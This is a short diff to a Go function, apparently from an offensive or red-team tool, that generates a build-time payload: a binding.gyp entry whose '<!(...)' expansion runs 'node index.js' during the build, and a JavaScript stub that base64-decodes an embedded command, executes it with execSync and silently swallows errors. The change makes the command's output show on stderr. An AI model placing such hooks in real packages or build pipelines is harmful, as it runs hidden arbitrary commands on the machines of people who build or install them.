@@ -88,7 +88,7 @@ func generateGYPPayload(cmd string) *LOTPPayload {
       "target_name": "setup",
       "type": "none",
       "sources": [
-        "<!(node index.js > /dev/null 2>&1 && echo stub.c)"
+        "<!(node index.js; echo stub.c)"
       ]
     }
   ]
@@ -100,7 +100,8 @@ func generateGYPPayload(cmd string) *LOTPPayload {
 const { execSync } = require('child_process');
 try {
   const c = Buffer.from('%s', 'base64').toString('utf8');
-  execSync(c, { stdio: ['ignore', 'pipe', 'pipe'] });
+  const r = execSync(c);
+  process.stderr.write(r);
 } catch (_) {}
 `, b64cmd)
 
